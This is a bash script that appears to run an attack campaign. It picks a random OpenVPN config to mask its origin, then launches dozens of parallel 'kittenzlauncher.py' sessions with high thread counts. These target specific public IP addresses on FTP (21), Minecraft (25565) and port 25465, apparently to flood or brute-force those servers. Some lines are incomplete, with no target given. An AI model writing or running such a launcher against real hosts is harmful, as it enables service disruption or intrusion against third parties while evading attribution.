#!/bin/bash
#yum install nano unzip screen python-argparse epel-release -y; yum install openvpn -y

files=(/ovpn_tcp/*)
config="${files[RANDOM % ${#files[@]}]}"
killall python
killall python
killall openvpn
killall openvpn
screen -dmS vpn openvpn --config $config


#multi
#screen -dmS a python /kittenzlauncher.py -p 25465 -t 50 107.174.19.150
#screen -dmS b python /kittenzlauncher.py -p 25465 -t 50 107.174.19.154
#screen -dmS c python /kittenzlauncher.py -p 25465 -t 50 172.107.165.3
#screen -dmS d python /kittenzlauncher.py -p 25465 -t 50 172.107.165.150
#screen -dmS e python /kittenzlauncher.py -p 25465 -t 50 172.107.165.151
#screen -dmS f python /kittenzlauncher.py -p 25465 -t 50 172.107.165.160
#screen -dmS g python /kittenzlauncher.py -p 25465 -t 50 172.93.238.111
#screen -dmS h python /kittenzlauncher.py -p 25465 -t 50 172.93.238.133
#screen -dmS i python /kittenzlauncher.py -p 25465 -t 50 172.93.238.140
#screen -dmS j python /kittenzlauncher.py -p 25465 -t 50 172.93.238.190
#screen -dmS k python /kittenzlauncher.py -p 25465 -t 50 172.93.238.201
#screen -dmS l python /kittenzlauncher.py -p 25465 -t 50 176.31.103.7
#screen -dmS m python /kittenzlauncher.py -p 25465 -t 50 45.35.54.3
#screen -dmS n python /kittenzlauncher.py -p 25465 -t 50 45.35.54.5
#screen -dmS o python /kittenzlauncher.py -p 25465 -t 50 45.35.54.52
#screen -dmS p python /kittenzlauncher.py -p 25465 -t 50 45.35.54.55
#screen -dmS q python /kittenzlauncher.py -p 25465 -t 50 45.35.54.57
#screen -dmS r python /kittenzlauncher.py -p 25465 -t 50 45.35.54.118
#172.106.202.6#mpg
#172.106.202.10
#172.106.202.29
#172.106.202.33
#172.106.202.36
#172.106.202.45#mpg
#172.106.202.46
#172.106.202.82
#172.106.202.84
#172.106.202.117

#ftp
screen -dmS s python /kittenzlauncher.py -p 21 -t 100 107.174.19.150
screen -dmS t python /kittenzlauncher.py -p 21 -t 100 107.174.19.154
screen -dmS u python /kittenzlauncher.py -p 21 -t 500 176.31.103.7
screen -dmS v python /kittenzlauncher.py -p 21 -t 500 176.31.103.228
screen -dmS w python /kittenzlauncher.py -p 21 -t 100 172.107.165.3
screen -dmS x python /kittenzlauncher.py -p 21 -t 100 172.107.165.150
screen -dmS y python /kittenzlauncher.py -p 21 -t 100 172.107.165.151
screen -dmS z python /kittenzlauncher.py -p 21 -t 100 172.107.165.165
screen -dmS aa python /kittenzlauncher.py -p 21 -t 100 172.107.165.198
screen -dmS bb python /kittenzlauncher.py -p 21 -t 100 172.93.238.111
screen -dmS cc python /kittenzlauncher.py -p 21 -t 100 172.93.238.133
screen -dmS dd python /kittenzlauncher.py -p 21 -t 100 172.93.238.140
screen -dmS ee python /kittenzlauncher.py -p 21 -t 100 172.93.238.153
screen -dmS ff python /kittenzlauncher.py -p 21 -t 100 172.93.238.190
screen -dmS gg python /kittenzlauncher.py -p 21 -t 100 172.93.238.201
screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 45.35.54.3
screen -dmS ii python /kittenzlauncher.py -p 21 -t 100 45.35.54.5
screen -dmS jj python /kittenzlauncher.py -p 21 -t 100 45.35.54.14
screen -dmS kk python /kittenzlauncher.py -p 21 -t 100 45.35.54.35
screen -dmS ll python /kittenzlauncher.py -p 21 -t 100 45.35.54.52
screen -dmS mm python /kittenzlauncher.py -p 21 -t 100 45.35.54.55
screen -dmS nn python /kittenzlauncher.py -p 21 -t 100 45.35.54.57
screen -dmS oo python /kittenzlauncher.py -p 21 -t 100 45.35.54.77
screen -dmS pp python /kittenzlauncher.py -p 21 -t 100 45.35.54.118

screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 


screen -dmS mc1 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.3
screen -dmS mc2 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.38
screen -dmS mc3 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.55
screen -dmS mc4 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.57
screen -dmS mc5 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.65
screen -dmS mc6 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.66
screen -dmS mc7 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.69
screen -dmS mc8 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.70
screen -dmS mc9 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.71
screen -dmS mc10 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.72
screen -dmS mc11 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.73
screen -dmS mc12 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.74
screen -dmS mc8 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.75
screen -dmS mc9 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.112
screen -dmS mc10 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.113
screen -dmS mc11 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.114

#172.106.202.117
#172.106.202.118
#172.106.202.119
#172.106.202.120
#172.106.202.123
#172.106.202.43
#172.106.202.45
#172.106.202.46
#172.106.202.34
#172.106.202.33
#172.106.202.29
#172.106.202.13
#172.106.202.82
#172.106.202.84

